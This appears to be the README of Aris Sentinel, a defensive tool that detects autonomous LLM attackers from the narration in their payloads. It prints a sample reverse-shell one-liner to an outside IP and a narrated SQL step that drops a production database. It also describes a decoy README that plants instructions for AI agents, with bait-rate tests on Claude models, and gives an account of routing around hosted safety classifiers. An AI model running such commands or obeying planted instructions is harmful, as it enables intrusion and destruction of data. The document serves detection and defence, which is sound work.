# Aris Sentinel

[![CI](https://github.com/kennysarnoski-jarvis/aris-sentinel/actions/workflows/ci.yml/badge.svg)](https://github.com/kennysarnoski-jarvis/aris-sentinel/actions/workflows/ci.yml)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

**Catch an AI attacker by its own chain of thought.**

Autonomous LLM agents now run intrusions end to end: recon, credential theft, lateral movement, exfiltration, ransom. No human at the keyboard. [JADEPUFFER](https://www.sysdig.com/blog/jadepuffer-agentic-ransomware-for-automated-database-extortion) was the first one caught in the wild, and its payloads had a tell: they were *"saturated with natural-language commentary explaining why each action is taken."*

Aris Sentinel is a small runtime agent (plain Node ≥ 18, zero dependencies, Apache-2.0) that watches what is about to execute on a server, decodes it, and scores it for the signature of an AI narrating its own attack. It runs in monitor mode by default. Arm it, and it kills the process tree at the first narrated step, phases before anything is encrypted.

![bun run score: an agent's attack step is BLOCKed with its narration quoted as evidence; a human reverse shell is CLEAR; a base64-wrapped payload is caught in a decoded layer](docs/demo-score.gif)

## The tell, in one screen

A JADEPUFFER-style step, as captured:

```python
# The previous DROP failed because of foreign key constraints.
# To bypass this, I will disable foreign key checks, then retry the drop.
run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0")
run_sql("DROP DATABASE production_orders")
# verifying the drop succeeded before moving to the next target
```

A human's reverse shell, as captured:

```bash
bash -i >& /dev/tcp/185.220.101.4/4444 0>&1
```

Both are malicious. Only one was written by an agent, and the detector says which:

```
$ bun run score corpus/positives/jadepuffer_retry_fk_bypass.py corpus/negatives/human-malware/reverse_shell.sh

corpus/positives/jadepuffer_retry_fk_bypass.py: BLOCK    score 0.75
  signals: agent_first_person, plan_act_observe, diagnosis_then_fix, intent_commentary_density
    [agent_first_person +3] "I will disable foreign key checks, then retry the drop. run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0")…"
    [plan_act_observe +2] "retry the drop. run_sql("SET GLOBAL FOREIGN_KEY_CHECKS=0") run_sql("DROP DATABASE…"
    [diagnosis_then_fix +4] "The previous DROP failed because of foreign key constraints. # To bypass this, I will disable…"
    [intent_commentary_density +2] "2 why-comments, e.g. "# The previous DROP failed because of foreign key constraints.""

corpus/negatives/human-malware/reverse_shell.sh: CLEAR    score 0.00
  signals: none — no narration signature
```

That is the whole idea. Sentinel is not looking for malware. It is looking for a language model thinking out loud in a place where no human ever would.

## Why it works, and why it keeps working

- **Humans don't narrate payloads. Agents do.** An agent states its goal, ranks targets by value, numbers its steps, diagnoses a failure and fixes it. That is not sloppiness, it is how the agent works: chain-of-thought *is* the capability.
- **To evade this, the attacker has to make its own agent dumber.** Suppress the narration and the agent plans worse. The defender does not have to win a signature arms race; the attacker's capability requirement is on our side. (Full argument: [docs/THESIS.md](docs/THESIS.md).)
- **The narration shows up in phase one.** JADEPUFFER explained itself from the first payload, five phases before the destructive step. That is the window.
- **It is app-agnostic.** The detector reads the attacker's LLM, not your code, so the same detector ships to every host with no per-host tuning. The same regexes that were built on Linux Python payloads catch narrated PowerShell unchanged.

JADEPUFFER is the existence proof, not the target. A signature for one crew's prompt would be worthless the day they changed it. Sentinel scores the category, self-narration, and a second tier judges the concept.

## Try it in two minutes

No key, no root, no kernel module. Needs [Bun](https://bun.sh) for the test harnesses; the agent itself only needs Node.

```bash
git clone https://github.com/kennysarnoski-jarvis/aris-sentinel.git && cd aris-sentinel && bun install
```

Score anything. A file, several files, or stdin:

```bash
bun run score path/to/any/script.py
```

```bash
cat something.sh | node agent/score.mjs
```

Exit code is 0 for clear, 1 for escalate, 2 for block, so it works as a gate. Add `--json` for the structured explanation and `--decide` to run the full policy through whatever judges you have configured.

Run the evidence:

```bash
bun run test:all
```

That scores the 94-file labeled corpus, replays the Windows event stream and eleven recorded sessions, checks the two-tier routing, and runs 307 unit tests. Takes a few seconds.

## How it decides

```
exec / script-block  ─►  decode (base64 · hex · nested)  ─►  tier 1: narration score
                                                                 │
                              block ◄── ≥0.60 ──────────────────┤
                              allow ◄── <0.30 ──────────────────┤
                                                      escalate (0.30–0.60)
                                                                 │
                               tier 2: LLM judge chain (local → Claude → openai → kimi)
                                                                 │
                     block ◄── agentic / fail-closed ────────────┼──── not-agentic ──► allow
                     alert ◄── no judge · budget spent ──────────┘
```

**Tier 1** is six feature families (ROI target-ranking, first-person agent voice, plan-act-observe structure, diagnosis-then-fix, why-comment density, exfil/ransom narration), deduplicated per family and saturated, so a block needs several *distinct* signals. It is local, instant, explainable, and it resolves the loud majority of traffic with zero LLM cost.

**Tier 2** is an LLM asked one question about the ambiguous middle: was this written by an autonomous agent conducting an attack? It judges the concept, not keywords, which is what catches styles the regexes never saw. It is a chain of optional judges and the first validated verdict wins:

| judge | config | why you'd pick it |
|---|---|---|
| **local** | `OPENAI_BASE_URL=http://127.0.0.1:11434/v1` + `OPENAI_MODEL` (Ollama, vLLM, llama.cpp) | nothing leaves the box; first in the chain by default. `qwen2.5:14b` went 74/74 on the corpus |
| **anthropic** | `ANTHROPIC_API_KEY` (Claude Opus 5.5) | 74/74 on the corpus; server-side fallbacks rescued 10/48 classifier declines in the matrix |
| **openai** | `OPENAI_API_KEY` + `OPENAI_MODEL`, or any remote OpenAI-compatible `OPENAI_BASE_URL` | bring your own |
| **kimi** | `KIMI_API_KEY` (Kimi K3) | no cyber input screen |

Tier 2 has a governor: verdicts are cached by payload hash, identical in-flight calls collapse, concurrency is capped, and a per-minute budget stops a chatty cron job from billing you every minute.

| decision | what the agent does |
|---|---|
| **block** | convicted. Monitor mode: log and report. `--enforce`: kill the process tree. `--enforce --kill-session` (Linux): also end every process in the offender's session and quarantine that session for ten minutes. |
| **alert** | suspicious, but no judge could rule (none configured, or budget spent). Logged and reported, **never killed**. |
| **allow** | clear at tier 1, or a judge said not-agentic. |
| **error** | the detector threw. Logged and reported as an incident, never silently dropped. Nothing killed. |

**Fail-closed.** If every judge refuses, errors or times out on an escalate-band payload, that is a block, not a pass. Attack narration is exactly the text a safety classifier declines, so a refusal is not evidence of innocence. `ARIS_FAIL_MODE=alert` is the knob if you would rather page than kill on an outage.

**Session evidence.** An agent does not have to put its reasoning in one place. "I'll check sudo first" in one command, "Step 2: list the shares, largest first" in the next, a why-comment in a third: each is weak on its own, and judging each exec alone lets the whole session through. So every narration-bearing payload is also kept in a window for its session (the Linux session id, or the PowerShell process) for ten minutes, and the window is scored as one text. When the window reaches the block band, meaning the same narration would have blocked had it arrived as one script, the **session transcript** goes to the judge. Session evidence can alert, or block with a judge's verdict. It never convicts at tier 1, so no process is killed on cross-command evidence without a judge. A session verdict is reused until the evidence grows, so a chatty benign session costs one judge call, not one per command.

```bash
bun run score --session corpus/sessions/agentic_thin_privesc.jsonl
```

**Tripwire (opt-in, `--tripwire`).** Everything above reads what the attacker's model *writes*. The tripwire keys on what it *does*, so it is the first signal here that still works when the model says nothing. The agent plants a small decoy directory (by default `/opt/vault-access` and `/var/backups/vault-access`; `C:\ProgramData\vault-access` on Windows) holding a README and an inert helper. The README tells any automated agent to "register its session" by running one command that carries a random per-host token, and tells human operators not to. Nothing on the host runs that command for any other reason. Two signals come out of it:

| what happened | decision | why |
|---|---|---|
| the canary token shows up in something that was **executed** (a command line, a script that was run, a base64 or hex layer of either) | **block**, at tier 1, no judge | somebody read the decoy and did what it said. The token is 128 random bits, so it cannot appear by accident |
| a command **addressed the decoy** (named the directory, or ran inside it) without the token | **alert**, never a kill | a look is not an act, and an administrator can do it too |

A block from the tripwire is handled like every other block: logged in monitor mode, killed under `--enforce`, and with `--kill-session` the session that took the bait is ended and quarantined. The helper itself is inert (it waits two seconds and prints one line), so killing it alone stops nothing; the session kill is what stops the agent, and the two-second wait is what keeps the session parked inside the helper until that kill lands. The token never leaves the host: a token hit is decided before the payload can reach a session window or a judge, and it is replaced by a fingerprint in every log line and incident, so reading or grepping the incident log cannot trip the wire. `uninstall.sh` (or `--tripwire-remove`) takes the decoys away. If you run your own AI agents on the host, tell them about the decoy or leave `--tripwire` off there.

## What it catches, and what it doesn't

Numbers from the labeled corpus, measured with the detector frozen *before* the 62 newest samples were written, so they are held out, not fitted ([corpus/README.md](corpus/README.md) has the method and the rules):

| class | n | block | escalate | clear |
|---|---|---|---|---|
| agentic (narrated attacks, 8 languages, every phase, several "voices") | 23 | 12 | 11 | **0** |
| benign (verbose, first-person, dual-use: agent-framework source, runbooks, churn ranking) | 30 | **0** | 13 | 17 |
| terse human one-liners | 9 | 0 | 0 | 9 |

- Tier 1 alone: precision 1.00, recall 0.52. Half the attacks are convicted locally for free.
- Nothing agentic slipped to clear, nothing benign was blocked, every terse one-liner stayed clear.
- 13 of 39 non-agentic files reached tier 2. That is the cost of the design, not a false positive: a thin "I'll check sudo first" from an agent and a Copilot comment both score 0.31 at tier 1, and only a judge of the concept can separate them.

**Sessions (2026-11-10, Claude Opus 5.5 as judge, same judge both columns).** Eleven recorded sessions: five agentic ones where no single command blocks at tier 1 except one deliberate loud opener, three quiet benign ones, three benign ones written to be loud (first-person, plan-shaped, "largest", "backed up to").

| | each command judged alone | with session evidence |
|---|---|---|
| agentic sessions with a block | 3 / 5 | **5 / 5** |
| agentic commands blocked | 4 / 20 | **8 / 20** |
| benign sessions blocked | 0 / 6 | **0 / 6** (the three loud ones reached the judge and were cleared) |
| judge calls, all eleven sessions | 16 | 18 |

One five-command session was cleared command by command, including one at 0.53, and convicted as a session at command four. A local `arete:27b` judge gave the same 11/11. Small sample, written by someone who knows the features; it measures the mechanism, not generalization. The commands before the window crosses the threshold have already run.

**The limit, stated plainly:** an agent told not to narrate is invisible to the narration detector. Zero narration is zero signal. Tier 2 narrows that gap and cannot close it. The stress test of a mutating attacker (`test/loop/`) caught 4 of 6 attempts; the two that evaded had suppressed their narration and achieved nothing real. The tripwire is the first signal that does not need narration, and it has its own limit, measured below.

**Tripwire bait rate (2026-11-10).** Whether a model runs the canary command is a property of that model, so it is measured, not assumed. `bun run tripwire:bait` gives a model an ordinary operations task in a simulated shell (nothing is executed) whose filesystem holds the decoy exactly as the agent plants it, and passes every command the model issues to the real tripwire matcher. Two tasks, five trials each, three hosted Claude models; 24 of 30 trials ran to their end (the other six were cut off by the provider's safety classifier and are left out of every rate):

| | Opus 5.5 | Sonnet 5.5 | Haiku 5.5 | all |
|---|---|---|---|---|
| trials that ran to their end | 9 | 5 | 10 | 24 |
| read the decoy README | 9 | 5 | 10 | 24 / 24 |
| a command addressed the decoy (**alert**) | 9 | 5 | 10 | **24 / 24** |
| ran the canary command (**block**) | 0 | 0 | 0 | **0 / 24** |
| said in its own words that the instruction looked wrong | 8 | 5 | 10 | 23 / 24 |

Read that as two results. The look is dependable: every model that explored the host touched the decoy, and each time the agent would have raised an alert with no narration involved. The bait is not: models trained to distrust instructions found in files read the README, called it out and moved on. So the `block` half of the tripwire only bites an attacker whose model is less careful than these, and how often that is true of the open-weight models attackers actually use is **not measured yet**. Until it is, treat the tripwire as an alert that needs no narration, with a conviction as the bonus. Small sample, one day, a simulated shell, benign tasks.

**With a judge, measured live (2026-11-07), two judges on the same cells:**

| | local `qwen2.5:14b` (Ollama, nothing leaves the box) | Claude Opus 5.5 (server-side fallbacks on) |
|---|---|---|
| pipeline: 28 agentic + 40 benign + 3 novel | 74/74 | 74/74 |
| adversarial false-positive set | 0/12 | 0/12 |
| novel attacks tier 1 only escalates | 5/5 | 5/5 (one via fail-closed: the cyber classifier declined it on every attempt) |
| judge matrix | 8/8 | 48/48 across Opus, Sonnet and Haiku 5.5 |

The matrix also showed *why the prompt matters*: with the original prompt the 14B model convicts anything plan-shaped; with the two-criteria prompt (AI authorship *and* malicious intent) it is 8/8, so that prompt now leads on every judge. And it showed the fallbacks working: 10 of 48 Claude cells were declined by the 5.5 classifier and rescued in the same call by Opus 4.8 or Sonnet 5, every rescue correct. Details and caveats in [corpus/README.md](corpus/README.md). One day, two models; the harnesses re-run on whatever you deploy.

## Run it for real

![The kill: on an Ubuntu VM with Falco, a narrated attacker is launched, the agent SIGKILLs it at exec with score 0.78, the destructive step never runs, and a benign job on the same box completes](docs/demo-kill.gif)

Reproduce that in about ten minutes with a throwaway VM: [docs/demo-kill/README.md](docs/demo-kill/README.md). The same VM runs the live validation of session evidence and session kill.

- **Linux.** [Falco](https://falco.org) taps every exec via eBPF; the agent scores the command line plus, for interpreters, the script file (resolved against the process's own cwd). Protected-process allowlist, per-session dedup, de-branded install so on-box recon sees a boring telemetry daemon. Verified live on Ubuntu 24.04, and recorded above: a narrated attacker SIGKILLed at exec, its destructive step never ran, a benign job untouched. [agent/DEPLOY.md](agent/DEPLOY.md).
- **Windows.** PowerShell Script Block Logging (Event ID 4104) hands the agent the already-deobfuscated script text. Same detector, `taskkill` instead of SIGKILL. Verified live on Windows Server 2022. [agent/win/WINDOWS.md](agent/win/WINDOWS.md).
- **At an HTTP sink.** A reverse proxy that blocks the JADEPUFFER entry payload at Langflow's code-exec endpoint (CVE-2025-3248) before `exec()` runs. [docs/RUNBOOK.md](docs/RUNBOOK.md).
- **What leaves the box, exactly.** [agent/DATA-HANDLING.md](agent/DATA-HANDLING.md). With a local judge and no cloud URL, nothing does.

Off-box alerting is optional. The agent can POST incidents to any receiver you point `ARIS_CLOUD_URL` at; [agent/aris-cloud-endpoint.py](agent/aris-cloud-endpoint.py) is an example that formats them into a plain-English Telegram message quoting the attacker's own words.

## The guardrail problem

A hosted model's safety classifier screens request *content*, not purpose. Ask it to label a captured attack payload and the classifier can decline before the model reads the question. In July 2026 Anthropic's real-time cyber screen refused 6 of 6 escalations on *benign* Terraform and Docker files that merely used security vocabulary. That is why the judge chain exists, and why three things are built in: a prompt that frames the request as labeling inert evidence and requires both AI authorship and malicious intent (the same prompt that stops a small local model from convicting every plan-shaped runbook), Anthropic's server-side fallbacks (a cyber-category decline is re-run on the model they recommend, inside the same call), and a local judge that has no screen at all. Security vendors can also apply to Anthropic's [Cyber Verification Program](https://support.claude.com/en/articles/14604842-real-time-cyber-safeguards-on-claude-opus-and-sonnet).

**What we saw on 2026-11-07, stated plainly.** Across 48 judge-matrix cells, Claude Opus 5.5 and Sonnet 5.5 declined 10 before judging: every attack-control payload on both models, and two benign ops files on Opus under the original prompt. All 10 were rescued in the same call by the fallback model (Opus 4.8, Sonnet 5) with the correct verdict. One payload, the file-ransomware probe, was declined by Opus 5.5 on both attempts and by its fallback too. It fell to fail-closed and was blocked, which is the designed outcome, but it was a block without a verdict. The local `qwen2.5:14b` judge answered that same payload, and matched Claude on every other decision. Haiku 5.5 declined nothing in the matrix but has no server-side fallback, so a decline there stays declined. The honest summary: hosted frontier models carry safety classifiers that fire on attack-shaped text regardless of your intent, the fallbacks recover most of it, a local model recovers the rest, and the chain exists so you don't have to choose. Anthropic's Cyber Verification Program is the route to lifting the classifier on a verified vendor's key. Full tables: [corpus/README.md](corpus/README.md).

## Configuration

| env | default | meaning |
|---|---|---|
| `ANTHROPIC_API_KEY` | — | Claude judge. `ARIS_MODEL` overrides `claude-opus-5-5`; `ARIS_TIER2_EFFORT` sets `low`…`max`; `ARIS_TIER2_FALLBACKS=0` turns server-side fallbacks off |
| `OPENAI_BASE_URL` + `OPENAI_MODEL` | — | OpenAI-wire judge. A loopback URL is the **local** leg; anything else is **openai**. `OPENAI_API_KEY` adds a bearer token |
| `KIMI_API_KEY` | — | Kimi K3 judge (`api.kimi.com/coding`, Anthropic wire) |
| `ARIS_TIER2_ORDER` | `local,anthropic,openai,kimi` | chain order; unconfigured legs skipped |
| `ARIS_FAIL_MODE` | `closed` | `alert` turns refusal/error/timeout into an alert instead of a block |
| `ARIS_TIER2_TIMEOUT_MS` / `ARIS_TIER2_DEADLINE_MS` | `20000` / `45000` | per attempt / whole chain |
| `ARIS_TIER2_CACHE_TTL_MS` / `ARIS_TIER2_CONCURRENCY` / `ARIS_TIER2_BUDGET_PER_MIN` | `600000` / `4` / `30` | the governor. Budget `0` = unlimited |
| `ARIS_CLOUD_URL` + `ARIS_INGEST_KEY` | — | off-box incident reports |
| `ARIS_INCIDENTS` | `/var/log/aris-incidents.jsonl` | local incident log |
| `ARIS_SESSION_TTL_MS` / `ARIS_SESSION_MAX_ITEMS` | `600000` / `12` | session evidence: how long a narration-bearing payload stays in its session's window, and how many are kept. TTL `0` turns it off |
| `ARIS_SESSION_QUARANTINE_MS` | `600000` | with `--kill-session`: how long a convicted session stays quarantined. `0` = kill what is alive, no quarantine |
| `ARIS_TRIPWIRE_DIRS` | `/opt/vault-access,/var/backups/vault-access` (Windows: `C:\ProgramData\vault-access`) | with `--tripwire`: comma-separated decoy directories. A directory that already exists and is not the agent's is never touched |
| `ARIS_TRIPWIRE_STATE` | `/var/lib/aris-sentinel/tripwire.json` (`install.sh`: `/var/lib/<name>/tripwire.json`) | with `--tripwire`: where the token and the list of planted files are kept, mode 0600 |
| `ARIS_VERBOSE=1` | — | log every allow too |

## Layout

- [`agent/sentinel-core.mjs`](agent/sentinel-core.mjs) is **the** detector: the only file that defines a pattern, a prompt, a threshold or the policy. Tier-1 features, decode stage, judge chain, governor, `decide()`, session evidence (`decideSession()`), and the tripwire (decoy text, matcher, policy, planting). One file, no imports beyond `node:*`, so it drops onto a bare box. A unit test fails if any other file defines a pattern.
- `detector/*.ts` are typed re-exports of the core for the TypeScript harnesses.
- `agent/sentinel-agent.mjs` (Linux), `agent/win/sentinel-agent-win.mjs` (Windows), `agent/score.mjs` (the CLI), `interposition/sentinel-langflow-demo.mjs` (HTTP sink) all import the core.
- `corpus/` is the labeled sample set; `test/corpus-snapshot.json` freezes every verdict so a detector change that moves one fails CI until the diff is reviewed.

## Tests

| command | what it proves | key |
|---|---|---|
| `bun run test` | tier-1 on the Linux corpus: precision 1.00, tier-1 recall 0.61, pipeline-reachable recall 1.00, 0 false positives; the decode stage defeats base64 and exec-wrapping | no |
| `bun test` | 307 unit tests: session evidence (window, reuse, no tier-1 conviction), session kill and quarantine (stubbed kill primitives), the tripwire (token and decoy matching, encoded layers, redaction, planting and removal in a temp directory, the token never reaching a judge or a log), verdict validation, timeouts, provider order on both wires, fallback gating, refusal stops, governor, policy, cwd resolution, inline-flag detection, alert and error incidents, the CLI, corpus snapshot, single-source guard | no |
| `bun run windows` | 10/10 narrated PowerShell caught, benign and encoded cradles clear | no |
| `bun run pipeline:stub` | only the escalate band reaches tier 2 | no |
| `bun run sessions:stub` | 11/11: thin agentic sessions reach the judge as a transcript, quiet benign sessions never do | no |
| `bun run selftest` / `bun run win:mock` | the agents end to end, no root | no |
| `bun run typecheck` | `tsc` over `detector/` and `test/` | no |
| `bun run test:all` | all of the above except typecheck; this is what CI runs | no |
| `bun run sessions` | the same eleven sessions with a real judge: agentic blocked via session, benign allowed. `-- --baseline` re-runs with session evidence off | **yes** |
| `bun run tripwire:bait` | the tripwire's bait rate on whatever models are configured: how often a model that reads the decoy runs its canary command, in a simulated shell | **yes** |
| `bun run tier2` / `bun run pipeline` / `bun run fpRate` / `bun run matrix` | tier 2 for real: catches the escalated attacks, clears the escalated benign files, compares judges on the same cells | **yes** |

## Contributing, and a heads-up about AI assistants

Contributions are welcome, corpus samples most of all. One thing to know before you start: this repo was built with Claude models as the coding assistant, and if you work on it the same way your assistant may refuse or stop part-way. The subject matter is attacks, and hosted models screen the content of a request, not its purpose. We hit that ourselves, repeatedly: judge requests declined before they were read, a benign backup-troubleshooting task refused five times out of five, replies cut off mid-conversation about hardening the detector. Everything in `bun run test:all` runs with no model at all, and a local model has no such screen. [CONTRIBUTING.md](CONTRIBUTING.md) has what trips it, what does not, and what to do.

## Go deeper

- [docs/THESIS.md](docs/THESIS.md): why this is a new category of attacker and why the signature is durable.
- [corpus/README.md](corpus/README.md): the sample classes, the held-out results, and the rule that nothing is tuned on a sample before it has been scored.
- [docs/HANDOFF.md](docs/HANDOFF.md): the engineering record of the reliability pass (what was wrong, what was fixed, what is unverified).
- [CONTRIBUTING.md](CONTRIBUTING.md): what we accept, and why a hosted AI assistant may decline to help you with this repo.
- [SECURITY.md](SECURITY.md): how to report a bypass or a bug that could hurt someone running this.

## Status

Working, tested, run on a handful of pilot hosts, not yet battle-hardened. Session-level kill (`--kill-session`) is implemented and validated live in the demo VM (24/24 checks on kernel 6.8 with Falco 0.45; `docs/demo-kill/validate-session-kill.sh`). It is a second opt-in on top of `--enforce`; read the warning in the deploy guide before arming it. The tripwire (`--tripwire`) is implemented and validated live on Linux in the same VM (26/26; `docs/demo-kill/validate-tripwire.sh`), and its bait rate is measured on three hosted Claude models (alert 24/24, canary command 0/24). It is unmeasured on open-weight models and untested on a real Windows host. That live run also found that a convicted session could get one more command off before it died, in the tripwire and in the session kill as first released; the kill order is fixed and both scripts now check for it. Not built yet: sink scoping for busy hosts, behavioral signals from timing and command shape, more sinks (file writes, HTTP bodies), a native Windows installer. Contributions that add corpus samples are the most valuable kind; see [CONTRIBUTING.md](CONTRIBUTING.md) and the rules in [corpus/README.md](corpus/README.md).

## License

[Apache-2.0](LICENSE). Copyright 2026 Aris Tech LLC.
